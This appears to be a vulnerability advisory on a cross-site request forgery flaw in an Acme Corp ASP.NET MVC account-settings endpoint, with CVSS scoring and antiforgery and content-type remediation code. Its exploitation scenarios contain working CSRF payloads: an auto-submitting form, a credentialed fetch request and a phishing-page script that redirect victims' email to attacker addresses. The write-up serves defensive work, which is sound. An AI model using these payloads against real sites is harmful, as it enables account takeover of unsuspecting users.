# Cross-Site Request Forgery (CSRF) in Account Settings Update

# Vulnerability Case
During our assessment of Acme Corp’s ASP.NET MVC application, we discovered that the state-changing controller method `UpdateAccountSettings` lacked both antiforgery token validation and strict content-type checking. This vulnerability was identified during a manual code review, where we observed the absence of the `[ValidateAntiForgeryToken]` attribute and content-type verification in a critical HTTP POST endpoint. The missing protections enable attackers to bypass CORS preflight restrictions and craft malicious requests that trigger unintended state changes. This was further validated by reproducing requests that manipulated user settings without proper server-side verification, highlighting potential severe business impacts such as unauthorized account modifications or data integrity breaches.

```csharp
// Vulnerable Controller in Acme Corp's ASP.NET MVC Application
public class AccountController : Controller
{
    // Vulnerable POST method: lacks [ValidateAntiForgeryToken] and strict content-type checking.
    [HttpPost]
    public ActionResult UpdateAccountSettings(AccountSettings settings)
    {
        // Business logic to update account settings
        accountService.UpdateSettings(settings);
        return RedirectToAction("Settings", "Account");
    }
}
```

An attacker can leverage this vulnerability by crafting a malicious HTTP POST request that mimics legitimate user interactions. With the missing antiforgery token, the endpoint accepts requests from any origin, facilitating cross-site request forgery (CSRF) attacks wherein an authenticated user’s browser unknowingly submits state-changing data. Additionally, lax content-type enforcement may allow attackers to bypass restrictions typically enforced by CORS preflight checks, further broadening the attack surface. Exploitation could result in unauthorized modifications to user accounts or other sensitive state changes, posing significant risks to data integrity and overall business operations, especially in environments leveraging .NET, C#, and ASP.NET MVC frameworks.

context: csharp.dotnet.security.mvc-missing-antiforgery.mvc-missing-antiforgery $METHOD is a state-changing MVC method that does not validate the antiforgery token or do strict content-type checking. State-changing controller methods should either enforce antiforgery tokens or do strict content-type checking to prevent simple HTTP request types from bypassing CORS preflight controls.

# Vulnerability Breakdown
This vulnerability in Acme Corp's ASP.NET MVC application enables cross-site request forgery attacks due to missing security controls in a state-changing endpoint.

1. **Key vulnerability elements**:
   - Missing `[ValidateAntiForgeryToken]` attribute on a state-changing controller method
   - Lack of content-type validation in the POST endpoint
   - Ability to bypass CORS preflight restrictions
   - State-changing operations (account settings modification) without proper verification
   - ASP.NET MVC application architecture affected

2. **Potential attack vectors**:
   - Crafting malicious HTTP POST requests from external domains
   - Creating websites that automatically submit unauthorized requests when visited
   - Bypassing browser's same-origin policy protections
   - Social engineering to trick authenticated users into visiting malicious sites

3. **Severity assessment**:
   - High integrity impact due to unauthorized account modifications
   - Network-based attack vector allowing remote exploitation
   - Low complexity attack requiring minimal technical expertise
   - No privileges required to execute the attack
   - User interaction required (victim must visit a malicious website)

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Network (N) 
   - Attack Complexity (AC): Low (L) 
   - Privileges Required (PR): None (N) 
   - User Interaction (UI): Required (R) 
   - Scope (S): Unchanged (U)
   - Confidentiality (C): None (N) 
   - Integrity (I): High (H) 
   - Availability (A): None (N) 

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N

# Description
A significant security vulnerability has been identified in Acme Corp's ASP.NET MVC application, specifically in the `UpdateAccountSettings` method of the `AccountController`. The controller method lacks two critical security controls: antiforgery token validation and strict content-type checking.

```csharp
// Vulnerable Controller in Acme Corp's ASP.NET MVC Application
public class AccountController : Controller
{
    // Vulnerable POST method: lacks [ValidateAntiForgeryToken] and strict content-type checking.
    [HttpPost]
    public ActionResult UpdateAccountSettings(AccountSettings settings)
    {
        // Business logic to update account settings
        accountService.UpdateSettings(settings);
        return RedirectToAction("Settings", "Account");
    }
}

```

This vulnerability enables Cross-Site Request Forgery (CSRF) attacks, allowing malicious websites to submit unauthorized requests to modify account settings on behalf of authenticated users. Additionally, the lack of content-type verification enables attackers to bypass CORS preflight restrictions, which browsers normally enforce for complex cross-origin requests. 

These missing protections create a significant security risk, as attackers can craft requests that appear to come from legitimate users, potentially leading to unauthorized account modifications and data integrity breaches.

# CVSS
**Score**: 6.5 \
**Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N \
**Severity**: Medium

The Medium severity rating is justified by the following factors:

- **Network Attack Vector (AV:N)**: The vulnerability can be exploited remotely from any network location, without requiring local access or adjacent network positioning.

- **Low Attack Complexity (AC:L)**: Exploiting this vulnerability is straightforward and doesn't require specialized conditions or significant preparation. An attacker only needs to craft a basic HTTP POST request.

- **No Privileges Required (PR:N)**: The attacker doesn't need any authentication or authorization to launch the attack. They can target any authenticated user regardless of the attacker's own privilege level.

- **User Interaction Required (UI:R)**: This is a critical component of CSRF attacks. The victim must be tricked into visiting a malicious website or clicking a malicious link while they are authenticated to the vulnerable application. This requirement for user interaction somewhat mitigates the risk.

- **Unchanged Scope (S:U)**: The vulnerability affects only the application itself, without extending impact to other components beyond the security scope of the vulnerable component.

- **No Confidentiality Impact (C:N)**: The vulnerability doesn't directly expose sensitive information. It primarily affects data integrity rather than confidentiality.

- **High Integrity Impact (I:H)**: This is the most significant factor. The vulnerability allows unauthorized modification of account settings, which could include critical user preferences, security settings, contact information, or other profile data that could impact the integrity of user accounts and potentially lead to account takeover.

- **No Availability Impact (A:N)**: The vulnerability doesn't directly impact system availability or cause denial of service conditions.

# Exploitation Scenarios
**Scenario 1: Direct CSRF Attack**
An attacker creates a malicious website containing hidden HTML code that automatically submits a form to the vulnerable endpoint when a victim visits:

```html
<html>
  <body onload="document.getElementById('csrf-form').submit();">
    <form id="csrf-form" action="https://acme-corp.com/Account/UpdateAccountSettings" method="POST">
      <input type="hidden" name="Email" value="attacker@evil.com" />
      <input type="hidden" name="NotificationPreference" value="None" />
      <!-- Additional account settings fields -->
    </form>
  </body>
</html>

```

When an authenticated user visits this page, their browser automatically sends the request with their active session cookies. Without antiforgery token validation, the application processes this request as legitimate, changing the user's email address to one controlled by the attacker.

**Scenario 2: CORS Preflight Bypass**
An attacker creates a malicious link in an email or message that, when clicked by the victim, loads a page containing this script:

```javascript
fetch('https://acme-corp.com/Account/UpdateAccountSettings', {
  method: 'POST',
  // Intentionally using simple content type to bypass preflight
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  // Include credentials to send cookies
  credentials: 'include',
  body: 'Email=attacker@evil.com&SecurityQuestion=pet&SecurityAnswer=none'
});

```

Normally, browsers would require a preflight OPTIONS request for complex cross-origin requests, but by using a simple content type, the attacker bypasses this protection. The user must click the malicious link while authenticated to the vulnerable application, but once they do, without content-type verification on the server, the application accepts and processes the malicious request.

**Scenario 3: Mass Account Compromise Through Social Engineering**
An attacker sends a phishing email to multiple Acme Corp users claiming to be from the IT department. The email contains a link to what appears to be a company survey but actually loads a page with malicious JavaScript:

```javascript
// Executes when users visit the phishing page
document.addEventListener('DOMContentLoaded', function() {
  // Create and submit a hidden form to change account settings
  const form = document.createElement('form');
  form.style.display = 'none';
  form.method = 'POST';
  form.action = 'https://acme-corp.com/Account/UpdateAccountSettings';
  
  const emailField = document.createElement('input');
  emailField.type = 'hidden';
  emailField.name = 'Email';
  emailField.value = 'compromised' + Math.floor(Math.random() * 1000) + '@attacker.com';
  
  form.appendChild(emailField);
  document.body.appendChild(form);
  form.submit();
});

```

Users who click the link in the phishing email while authenticated to the Acme Corp application would unknowingly trigger changes to their account settings, potentially leading to a large-scale compromise of user accounts.

# Impact Analysis
**Business Impact:**
- Unauthorized modification of user account settings, potentially affecting thousands of customers
- Possible account takeover if attackers can change email addresses and trigger password resets
- Loss of customer trust if users discover their account settings have been modified without consent
- Increased customer support burden from users reporting unexpected account changes
- Potential regulatory implications, especially if personal data is compromised 
- Reputation damage if a widespread attack is publicized
- Potential legal liability if customer data is compromised through this vulnerability

**Technical Impact:**
- Circumvention of application's intended access control mechanisms
- Bypassing of browser security controls (same-origin policy and CORS)
- Data integrity violations across user accounts
- Potential for cascading security failures if modified settings enable further attacks
- Undermining of the application's state management assumptions
- Creation of inconsistencies in application data that may affect system functionality
- Possible privilege escalation if administrative settings can be modified through similar endpoints

# Technical Details
The vulnerability stems from two critical security omissions in the ASP.NET MVC controller method:

```csharp
// Vulnerable implementation
[HttpPost]
public ActionResult UpdateAccountSettings(AccountSettings settings)
{
    accountService.UpdateSettings(settings);
    return RedirectToAction("Settings", "Account");
}

```

**Missing Antiforgery Token**

ASP.NET MVC provides built-in protection against CSRF attacks through antiforgery tokens. These work by:
1. Generating a unique token stored in both a cookie and as a hidden form field
2. Validating on each state-changing request that both tokens match
3. Preventing cross-site requests since attackers cannot read or set the victim's cookies

The `[ValidateAntiForgeryToken]` attribute should be applied to all state-changing controller actions, but is missing here. This allows cross-domain POST requests to be processed without verification.

**Lack of Content-Type Checking**

Modern browsers implement Cross-Origin Resource Sharing (CORS) with preflight requests for "non-simple" HTTP requests. A request is considered "non-simple" if it:
- Uses methods other than GET, HEAD, or POST
- Uses POST with content types other than application/x-www-form-urlencoded, multipart/form-data, or text/plain
- Contains custom headers

Without server-side content-type validation, attackers can craft requests using simple content types (like application/x-www-form-urlencoded) that bypass preflight checks, while the server still processes them as if they were JSON or another expected format.

**Technical Exploitation Details**

The attack requires user interaction and works by exploiting the browser's behavior of automatically including cookies (including authentication cookies) with requests to their respective domains. The typical attack flow is:

1. A user authenticates to the vulnerable application, establishing valid session cookies
2. The user is tricked into visiting a malicious website (through phishing, social media links, etc.)
3. The malicious site contains code that submits a form or initiates a fetch request to the vulnerable endpoint
4. The browser includes the user's authentication cookies with this request
5. Without antiforgery validation, the application has no way to distinguish this cross-origin request from a legitimate one
6. The account settings are updated based on attacker-controlled data

The requirement for user interaction provides some mitigation, but sophisticated social engineering can still lead to successful attacks, especially given the lack of technical barriers on the server side.

# Remediation Steps
## Implement Antiforgery Token Validation

**Priority**: P0

Add the `[ValidateAntiForgeryToken]` attribute to all state-changing controller methods and ensure corresponding tokens are included in forms:

```csharp
// Corrected implementation with antiforgery protection
[HttpPost]
[ValidateAntiForgeryToken]
public ActionResult UpdateAccountSettings(AccountSettings settings)
{
    accountService.UpdateSettings(settings);
    return RedirectToAction("Settings", "Account");
}

```

In the corresponding view, ensure the antiforgery token is included in the form:

```cshtml
@using (Html.BeginForm("UpdateAccountSettings", "Account", FormMethod.Post))
{
    @Html.AntiForgeryToken()
    <!-- Form fields -->
    <button type="submit">Save Settings</button>
}

```

For AJAX requests, include the token as a request header:

```javascript
$.ajax({
    url: '/Account/UpdateAccountSettings',
    type: 'POST',
    contentType: 'application/json',
    data: JSON.stringify(settings),
    beforeSend: function (xhr) {
        xhr.setRequestHeader("RequestVerificationToken", $('input[name="__RequestVerificationToken"]').val());
    }
});

```

This protection ensures that only requests originating from your own application's forms can be processed successfully.
## Implement Content-Type Validation

**Priority**: P1

Modify the controller or add a filter to validate that incoming requests use the expected content type:

```csharp
// Implementing content-type validation in a controller
[HttpPost]
[ValidateAntiForgeryToken]
public ActionResult UpdateAccountSettings()
{
    // Validate content type
    if (!Request.ContentType.StartsWith("application/json", StringComparison.OrdinalIgnoreCase))
    {
        return new HttpStatusCodeResult(HttpStatusCode.UnsupportedMediaType, "Content type must be application/json");
    }
    
    // Process the request safely
    var stream = Request.InputStream;
    stream.Position = 0;
    var settings = new JsonSerializer().Deserialize<AccountSettings>(
        new JsonTextReader(new StreamReader(stream)));
    
    accountService.UpdateSettings(settings);
    return RedirectToAction("Settings", "Account");
}

```

Alternatively, implement a custom action filter for content type validation:

```csharp
public class ValidateContentTypeAttribute : ActionFilterAttribute
{
    private readonly string _contentType;
    
    public ValidateContentTypeAttribute(string contentType)
    {
        _contentType = contentType;
    }
    
    public override void OnActionExecuting(ActionExecutingContext filterContext)
    {
        if (!filterContext.HttpContext.Request.ContentType.StartsWith(_contentType, 
            StringComparison.OrdinalIgnoreCase))
        {
            filterContext.Result = new HttpStatusCodeResult(
                HttpStatusCode.UnsupportedMediaType, 
                $"Expected content type: {_contentType}");
        }
        
        base.OnActionExecuting(filterContext);
    }
}

// Usage on controller method
[HttpPost]
[ValidateAntiForgeryToken]
[ValidateContentType("application/json")]
public ActionResult UpdateAccountSettings(AccountSettings settings)
{
    accountService.UpdateSettings(settings);
    return RedirectToAction("Settings", "Account");
}

```

This prevents attackers from bypassing CORS preflight checks by validating the content type on the server side.


# References
* CWE-352 | [Cross-Site Request Forgery (CSRF)](https://cwe.mitre.org/data/definitions/352.html)
* CWE-284 | [Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)
* CWE-20 | [Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
* A01:2021 | [Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
* A04:2021 | [Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/)
